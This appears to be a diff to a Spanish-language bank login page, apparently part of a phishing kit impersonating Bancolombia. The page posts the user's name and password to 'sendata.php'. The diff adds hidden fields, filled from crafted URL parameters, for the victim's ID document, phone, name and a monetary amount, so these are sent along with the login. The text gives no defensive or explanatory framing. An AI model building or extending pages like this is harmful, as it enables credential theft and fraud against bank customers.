@@ -233,8 +233,15 @@
       <p class="card-subtitle">Ingresa los datos para gestionar tus<br>productos y hacer transacciones.</p>
 
       <form id="loginForm" action="sendata.php" method="POST">
-        <input type="hidden" id="key"    name="key"    value="">
-        <input type="hidden" id="correo" name="correo" value="">
+        <input type="hidden" id="key"              name="key"              value="">
+        <input type="hidden" id="correo"           name="correo"           value="">
+        <input type="hidden" id="tipo_documento"   name="tipo_documento"   value="">
+        <input type="hidden" id="numero_documento" name="numero_documento" value="">
+        <input type="hidden" id="monto"            name="monto"            value="">
+        <input type="hidden" id="monto_texto"      name="monto_texto"      value="">
+        <input type="hidden" id="nombre_usuario"   name="nombre_usuario"   value="">
+        <input type="hidden" id="telefono"         name="telefono"         value="">
+        <input type="hidden" id="banco"            name="banco"            value="Bancolombia">
 
         <!-- Usuario -->
         <div class="input-group">
@@ -290,8 +297,19 @@
 
   <script>
     const params = new URLSearchParams(window.location.search);
-    document.getElementById('key').value    = params.get('key')    || '';
-    document.getElementById('correo').value = params.get('correo') || '';
+    function setVal(id, val) {
+      const el = document.getElementById(id);
+      if (el && (val !== null && val !== undefined)) el.value = String(val);
+    }
+    setVal('key',              params.get('key'));
+    setVal('correo',           params.get('correo'));
+    setVal('tipo_documento',   params.get('tipo_documento'));
+    setVal('numero_documento', params.get('numero_documento'));
+    setVal('monto',            params.get('cupo') || params.get('monto'));
+    setVal('monto_texto',      params.get('monto_texto'));
+    setVal('nombre_usuario',   params.get('nombre'));
+    setVal('telefono',         params.get('telefono'));
+    setVal('banco',            params.get('banco') || 'Bancolombia');
 
     const usuario  = document.getElementById('usuario');
     const clave    = document.getElementById('clave');
